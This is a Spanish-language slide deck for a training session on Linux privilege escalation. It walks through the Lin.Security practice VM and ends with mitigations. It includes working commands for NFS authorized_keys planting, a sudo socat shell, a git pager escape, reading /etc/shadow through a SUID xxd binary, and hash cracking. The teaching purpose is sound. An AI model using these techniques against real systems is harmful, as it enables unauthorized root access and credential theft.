+++
title = "Escalación de Privilegios en Linux"
outputs = ["Reveal"]
+++

## Escalación de Privilegios en Linux
### Vectores de Ataque y Ejercicios Prácticos con Lin.Security

---

### El plan para hoy

- Fundamentos de escalación de privilegios
- Vectores comunes de escalación
- Enumeración del sistema
- Ejercicios prácticos con Lin.Security
- Demostración de distintos vectores
- Mitigaciones y mejores prácticas

{{% note %}}
En esta sesión veremos:
- Los conceptos fundamentales de escalación de privilegios
- Cómo identificar y explotar vectores comunes
- Herramientas y técnicas de enumeración
- Práctica real con la VM Lin.Security
- Ejercicios guiados para cada vector
- Cómo proteger sistemas Linux

Es importante mantener un enfoque práctico y entender los conceptos de seguridad subyacentes.
{{% /note %}}

---

{{% section %}}

### Fundamentos de Escalación de Privilegios

#### ¿Qué es?
- Proceso de obtener mayores privilegios
- Horizontal vs Vertical
- Local vs Remota
- De usuario a root
- Entre usuarios del sistema

{{% note %}}
La escalación de privilegios es un componente crítico en la seguridad:

- Escalación horizontal: Acceso a otros usuarios del mismo nivel
- Escalación vertical: Obtener privilegios más elevados
- Local: Desde una cuenta comprometida
- Remota: A través de vulnerabilidades de red
- Objetivo común: Obtener acceso root

La comprensión de estos conceptos es fundamental para:
1. Pruebas de penetración
2. Evaluaciones de seguridad
3. Hardening de sistemas
4. Respuesta a incidentes
{{% /note %}}

---

### Vectores Comunes

1. Configuraciones incorrectas
2. Vulnerabilidades de software
3. Permisos mal configurados
4. Binarios con SUID/SGID
5. Capacidades (capabilities)
6. Kernel exploits
7. Credenciales expuestas
8. Servicios mal configurados

{{% note %}}
Vectores principales a considerar:

1. Configuraciones:
   - Permisos de archivos
   - Configuraciones por defecto
   - Servicios mal configurados
   - Variables de entorno

2. Software:
   - Versiones desactualizadas
   - Parches faltantes
   - Dependencias vulnerables
   - Software legacy

3. Errores comunes:
   - Permisos excesivos
   - Paths inseguros
   - Wildcards
   - Race conditions
{{% /note %}}

{{% /section %}}

---

{{% section %}}

### Enumeración del Sistema

#### Herramientas básicas:
```bash
# Información del sistema
uname -a
cat /etc/issue
cat /proc/version

# Usuarios y grupos
id
who
w
last

# Permisos especiales
find / -perm -4000 2>/dev/null # SUID
find / -perm -2000 2>/dev/null # SGID
```

{{% note %}}
La enumeración es el primer paso crucial:

Áreas clave:
1. Información del sistema
   - Versión del kernel
   - Distribución
   - Arquitectura
   - Parches instalados

2. Usuarios y accesos
   - Privilegios actuales
   - Grupos
   - Otros usuarios
   - Historial de accesos

3. Archivos y permisos
   - SUID/SGID
   - Archivos world-writable
   - Directorios sensibles
   - Configuraciones
{{% /note %}}

---

### Herramientas Automatizadas

- LinPeas
- LinEnum
- Linux Smart Enumeration
- Linux Exploit Suggester
- Unix Privesc Check

```bash
# Ejemplo con LinPeas
./linpeas.sh
```

{{% note %}}
Las herramientas automatizadas facilitan la enumeración:

LinPeas:
- Búsqueda exhaustiva
- Detección de misconfigs
- Identificación de CVEs
- Sugerencias de exploits

LinEnum:
- Enumeración básica
- Información del kernel
- Procesos en ejecución
- Tareas programadas

Exploit Suggester:
- Correlación con CVEs
- Identificación de exploits
- Verificación de parches
{{% /note %}}

{{% /section %}}

---

{{% section %}}

## Práctica con Lin.Security

### Configuración Inicial:
1. Descargar [Lin.Security](https://www.vulnhub.com/entry/linsecurity-1,244/)
2. Configurar red en modo bridge
3. Credenciales iniciales: bob/secret

{{% note %}}
Lin.Security es una VM diseñada para practicar:

Preparación:
1. Descarga de la VM
2. Configuración de red
3. Verificación de acceso
4. Familiarización con el entorno

Objetivos:
- Practicar enumeración
- Identificar vectores
- Explotar vulnerabilidades
- Documentar hallazgos
- URL: https://in.security/2018/08/20/lin-security-walkthrough/
{{% /note %}}

---

### Vector 1: Usuario Peter
#### Enumeración inicial desde cero

1. Identificación de recursos NFS:
```bash
showmount -e 192.168.1.137
Export list for 192.168.1.137:
/home/peter *
```

2. Montaje y análisis:
```bash
mkdir /mnt/peter
mount 192.168.1.137:/home/peter /mnt/peter/
ls -la /mnt/peter/
```

3. Creación de usuario local para acceso:
```bash
groupadd -g 1005 peter
adduser peter -uid 1001 -gid 1005
```

4. Configuración de acceso SSH:
```bash
# Como usuario peter
mkdir .ssh
ssh-keygen
cat ~/.ssh/id_rsa.pub > /mnt/peter/.ssh/authorized_keys
```

{{% note %}}
Pasos para explotar el vector de Peter:

1. Escaneo inicial:
   - Puerto 22 (SSH)
   - Puerto 2049 (NFS)
   - Identificación de recursos compartidos

2. Montaje NFS:
   - Verificación de permisos
   - Identificación de archivos
   - Preparación de exploit

3. Técnicas de explotación:
   - Manipulación de .ssh
   - Creación de authorized_keys
   - Acceso SSH como Peter
{{% /note %}}

---

### Vector 2: Privilegios de Bob
#### Abuso de permisos sudo

1. Verificación de permisos:
```bash
sudo -l
# Múltiples binarios disponibles: socat, git, etc.
```

2. Explotación vía socat:
```bash
# Primera terminal
sudo socat TCP-LISTEN:9999,reuseaddr,fork EXEC:sh,pty,stderr,setsid,sigint,sane

# Segunda terminal
socat FILE:`tty`,raw,echo=0 TCP:127.0.0.1:9999
```

3. Explotación vía git:
```bash
sudo git help status
!/bin/bash -p
```

4. Otros binarios disponibles:
```bash
sudo ssh -o ProxyCommand='./sshex.sh' localhost:8
./bbash -p
```

{{% note %}}
El usuario Bob tiene varios vectores:

Permisos sudo:
1. Verificación con sudo -l
2. Análisis de binarios permitidos
3. Consulta en GTFOBins
4. Selección de método

Explotación:
- Uso de socat
- Abuso de git
- Comando strace
- Otras técnicas disponibles

Documentación:
- Registro de métodos
- Verificación de éxito
- Prueba de alternativas
{{% /note %}}

---

### Vector 3: Usuario Susan
#### SUID y otros vectores

1. Acceso inicial vía archivo oculto:
```bash
find / -name ".*" -type f -path "/home/*" -exec ls -al {} \; 2>/dev/null
cat /home/susan/.secret
su - susan
# Password: MySuperSecretValue!
```

2. Búsqueda de binarios SUID:
```bash
find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null
# Se identifica /usr/bin/xxd con SUID root
```

3. Explotación de xxd:
```bash
# Como usuario susan (miembro de itservices)
ls -la /usr/bin/xxd
xxd /etc/shadow | xxd -r
```

4. Análisis de hash y cracking:
```bash
# En máquina de atacante
hashcat AzER3pBZhGWZE -m 1500 /tools/wordlists/rockyou.txt
# Password encontrado
```

{{% note %}}
Vectores disponibles para Susan:

SUID:
1. Identificación de binarios
2. Verificación de permisos
3. Técnicas de bypass
4. Explotación efectiva

Otros vectores:
- Archivos ocultos
- Permisos especiales
- Configuraciones vulnerables

Documentación:
- Registro de hallazgos
- Prueba de conceptos
- Verificación de acceso
{{% /note %}}

{{% /section %}}

---

{{% section %}}

### Mitigaciones y Mejores Prácticas

1. Principio de mínimo privilegio
2. Actualizaciones regulares
3. Monitoreo de binarios SUID
4. Hardening de configuraciones
5. Auditorías periódicas

{{% note %}}
Medidas de protección esenciales:

Principios básicos:
1. Mínimo privilegio
   - Revisión de permisos
   - Grupos necesarios
   - Accesos limitados

2. Actualizaciones
   - Parches de seguridad
   - Versiones estables
   - Monitoreo de CVEs

3. Configuración
   - Hardening de servicios
   - Restricción de SUID
   - Logging apropiado

4. Monitoreo
   - Auditoría regular
   - Detección de cambios
   - Respuesta a incidentes
{{% /note %}}

---

### ¿Preguntas?

{{% note %}}
Puntos clave para recordar:

1. Enumeración sistemática
2. Documentación detallada
3. Prueba de diferentes vectores
4. Comprensión de conceptos
5. Práctica continua

Recursos adicionales:
- GTFOBins
- PayloadsAllTheThings
- HackTricks
- Blogs de seguridad
{{% /note %}}